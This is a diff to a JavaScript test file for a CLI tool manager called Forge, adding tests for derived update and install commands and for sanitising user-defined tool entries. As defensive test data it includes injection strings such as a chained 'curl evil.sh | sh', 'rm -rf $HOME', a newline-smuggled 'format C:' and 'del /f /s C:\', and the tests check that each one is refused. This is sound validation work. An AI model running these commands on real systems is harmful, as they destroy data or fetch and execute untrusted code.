@@ -41,8 +41,17 @@ registerHooks({
 })
 
 const {
+  KNOWN_TOOLS,
+  MAX_CUSTOM_TOOLS,
   TOOL_SPECS,
+  allToolSpecs,
   compareVersions,
+  customToolId,
+  installCommandFor,
+  isPlainCommand,
+  sanitiseCustomTool,
+  sanitiseCustomTools,
+  updateCommandFor,
   displayLatest,
   formatRate,
   isNewer,
@@ -74,13 +83,27 @@ const ok = (cond, label, detail = '') => {
 /* ------------------------------------------------------------- catalogue */
 
 console.log('\ncatalogue')
-ok(TOOL_SPECS.length === 5, 'five tools', `${TOOL_SPECS.length}`)
 ok(
   new Set(TOOL_SPECS.map((t) => t.id)).size === TOOL_SPECS.length,
   'every tool id is unique'
 )
+ok(
+  new Set(KNOWN_TOOLS.map((t) => t.id)).size === KNOWN_TOOLS.length,
+  'every suggested tool id is unique'
+)
+// A suggestion that is already built in would be a row you can add and then
+// watch do nothing, because allToolSpecs drops the duplicate.
+ok(
+  KNOWN_TOOLS.every((k) => !TOOL_SPECS.some((t) => t.command === k.command)),
+  'no suggestion duplicates a built-in'
+)
+ok(
+  [...TOOL_SPECS, ...KNOWN_TOOLS].every((t) => isPlainCommand(t.command)),
+  'every catalogued command is one Forge is willing to spawn'
+)
 ok(toolSpec('claude')?.latest.npmPackage === '@anthropic-ai/claude-code', 'Claude Code is the right npm package')
 ok(toolSpec('gemini')?.latest.npmPackage === '@google/gemini-cli', 'Gemini CLI is the right npm package')
+ok(toolSpec('codex')?.latest.npmPackage === '@openai/codex', 'Codex CLI is the right npm package')
 ok(toolSpec('pwsh')?.latest.wingetIds?.[0] === 'Microsoft.PowerShell', 'PowerShell is a winget package')
 // Kimi is a .cmd shim wrapping Claude Code. Probing it for a version would
 // start Claude and report Claude's number, which is a wrong answer that looks
@@ -88,11 +111,152 @@ ok(toolSpec('pwsh')?.latest.wingetIds?.[0] === 'Microsoft.PowerShell', 'PowerShe
 ok(toolSpec('kimi')?.versionArgs === null, 'Kimi is never spawned for a version')
 ok(toolSpec('kimi')?.updateCommand === null, 'Kimi has no update command')
 ok(toolSpec('kimi')?.latest.source === 'local', 'Kimi is managed locally')
-ok(toolSpec('node')?.updateCommand === null, 'Node has no update command — nvm and winget disagree about how')
+ok(toolSpec('node')?.updateCommand === null, 'Node has no update command of its own — nvm and winget disagree about how')
 ok(
-  TOOL_SPECS.every((t) => !t.updateCommand || !/\b(-y|--silent|--force|--accept-package-agreements)\b/.test(t.updateCommand)),
-  'no update command silences its own prompts'
+  [...TOOL_SPECS, ...KNOWN_TOOLS].every(
+    (t) =>
+      ![updateCommandFor(t), installCommandFor(t), t.updateCommand, t.installCommand]
+        .filter(Boolean)
+        .some((c) => /\b(-y|--silent|--force|--accept-package-agreements|--accept-source-agreements)\b/.test(c))
+  ),
+  'no update or install command silences its own prompts'
 )
+
+/* ------------------------------------------------------ derived commands */
+
+console.log('\nwhat the buttons type')
+ok(updateCommandFor(toolSpec('claude')) === 'claude update', 'an explicit command wins over the derived one')
+ok(
+  updateCommandFor(toolSpec('gemini')) === 'npm i -g @google/gemini-cli',
+  'npm derives from the package it already checks',
+  String(updateCommandFor(toolSpec('gemini')))
+)
+ok(
+  updateCommandFor(toolSpec('codex')) === 'npm i -g @openai/codex',
+  'so a tool nobody has installed still has a working button'
+)
+ok(
+  updateCommandFor(toolSpec('pwsh')) === 'winget upgrade --id Microsoft.PowerShell --exact',
+  'one winget id needs no disambiguation',
+  String(updateCommandFor(toolSpec('pwsh')))
+)
+// THE Node case. Two ids, and upgrading the wrong one either does nothing or
+// installs a second Node beside the one on PATH.
+ok(updateCommandFor(toolSpec('node')) === null, 'two winget ids and no check yet → no button, not a guess')
+ok(
+  updateCommandFor(toolSpec('node'), { id: 'node', source: 'winget', via: 'OpenJS.NodeJS.LTS', checkedAt: 1 }) ===
+    'winget upgrade --id OpenJS.NodeJS.LTS --exact',
+  'the id that answered the check is the one that gets upgraded'
+)
+ok(
+  updateCommandFor(toolSpec('node'), { id: 'node', source: 'winget', via: 'Some.Other.Id', checkedAt: 1 }) === null,
+  'a via that is not one of ours is ignored rather than typed'
+)
+ok(updateCommandFor(toolSpec('kimi')) === null, 'a local shim still has nothing to type')
+ok(installCommandFor(toolSpec('kimi')) === null, '…and nothing to install')
+ok(
+  installCommandFor(toolSpec('codex')) === 'npm i -g @openai/codex',
+  'install and update are the same command for npm, which is why the row works either way'
+)
+ok(
+  installCommandFor(toolSpec('node')) === 'winget install --id OpenJS.NodeJS.LTS --exact',
+  'with nothing installed there is nothing to be wrong about, so the first id (LTS) wins',
+  String(installCommandFor(toolSpec('node')))
+)
+
+/* --------------------------------------------------------- custom tools */
+
+console.log('\ncustom tools')
+// The security-shaped one. This string is spawned to read a version, so a row
+// that ends the command and starts another must not survive validation.
+ok(isPlainCommand('codex'), 'a program name is fine')
+ok(isPlainCommand('C:\\tools\\thing.exe'), 'a path is fine')
+ok(!isPlainCommand('codex && curl evil.sh | sh'), 'a chained command is refused')
+ok(!isPlainCommand('rm -rf $HOME'), 'a variable is refused')
+ok(!isPlainCommand('a`whoami`'), 'a backtick is refused')
+ok(!isPlainCommand('a%PATH%'), 'a Windows variable is refused')
+ok(!isPlainCommand(''), 'nothing is not a command')
+
+ok(customToolId('Windows Terminal') === 'x:windows-terminal', 'an id is a slug behind the custom prefix')
+ok(customToolId('!!!') === 'x:tool', 'punctuation alone still yields something usable')
+
+{
+  const tool = sanitiseCustomTool({
+    name: '  Bun  ',
+    command: 'bun',
+    latest: { source: 'winget', wingetIds: ['Oven-sh.Bun'] }
+  })
+  ok(tool?.id === 'x:bun', 'a row gets an id from its name', String(tool?.id))
+  ok(tool?.versionArgs?.[0] === '--version', 'and the usual version flag when none was given')
+  ok(tool?.custom === true, 'and is marked as one of yours')
+  ok(updateCommandFor(tool) === 'winget upgrade --id Oven-sh.Bun --exact', 'and a working Update button')
+}
+
+ok(sanitiseCustomTool({ command: 'bun' }) === null, 'no name is not a tool')
+ok(sanitiseCustomTool({ name: 'Bun' }) === null, 'no command is not a tool')
+ok(sanitiseCustomTool({ name: 'Evil', command: 'a & b' }) === null, 'a shell-shaped command is refused outright')
+ok(sanitiseCustomTool(null) === null, 'junk is not a tool')
+
+{
+  // A command with a newline in it, stored, would run its second line the
+  // moment "press Enter for me" is on. Everything typed into a pane is put
+  // through oneLine for exactly this.
+  const tool = sanitiseCustomTool({
+    name: 'Sneaky',
+    command: 'bun',
+    latest: { source: 'none' },
+    updateCommand: 'echo one\r\nformat C:'
+  })
+  ok(!/[\r\n]/.test(tool?.updateCommand ?? ''), 'a stored command cannot contain a line break')
+}
+
+{
+  const tool = sanitiseCustomTool({ name: 'Nope', command: 'nope', latest: { source: 'npm', npmPackage: 'not a package' } })
+  ok(tool?.latest.source === 'none', 'a package name that cannot exist becomes "not checked", not a permanent 404')
+}
+
+{
+  const tool = sanitiseCustomTool({ name: 'Shim', command: 'shim', versionArgs: null, latest: { source: 'local' } })
+  ok(tool?.versionArgs === null, 'null version arguments survive — "never spawn this" is a real answer')
+}
+
+{
+  const tools = sanitiseCustomTools([
+    { name: 'Bun', command: 'bun' },
+    { name: 'Bun', command: 'bun2' },
+    { name: '', command: 'x' },
+    { id: 'claude', name: 'Fake Claude', command: 'claude', updateCommand: 'del /f /s C:\\' }
+  ])
+  ok(tools.length === 2, 'the duplicate name and the nameless entry are dropped', `${tools.length}`)
+  ok(tools[0]?.id === 'x:bun', 'the first of a duplicate pair wins')
+  // The entry claiming to *be* claude survives — as `x:claude`, its own row,
+  // named "Fake Claude". What it cannot do is become the Claude Code row and
+  // quietly change what that row's Update button types.
+  ok(
+    !tools.some((t) => t.id === 'claude'),
+    'a hand-written entry cannot take a built-in id — it is namespaced, not obeyed'
+  )
+  ok(toolSpec('claude')?.updateCommand === 'claude update', 'and the real row is untouched')
+}
+
+{
+  const many = Array.from({ length: MAX_CUSTOM_TOOLS + 20 }, (_, i) => ({ name: `T${i}`, command: `t${i}` }))
+  ok(sanitiseCustomTools(many).length === MAX_CUSTOM_TOOLS, 'the list is capped')
+  ok(sanitiseCustomTools('not a list').length === 0, 'a non-list is an empty list')
+}
+
+{
+  const merged = allToolSpecs([
+    sanitiseCustomTool({ name: 'Bun', command: 'bun' }),
+    { ...toolSpec('claude'), updateCommand: 'del /f /s C:\\' }
+  ])
+  ok(merged.length === TOOL_SPECS.length + 1, 'the catalogue is the built-ins plus what survived')
+  ok(
+    merged.find((t) => t.id === 'claude')?.updateCommand === 'claude update',
+    'and a shadowing entry cannot displace a built-in even at merge time'
+  )
+  ok(allToolSpecs(null).length === TOOL_SPECS.length, 'no custom tools is just the built-ins')
+}
 
 /* ------------------------------------------------------- version parsing */
 
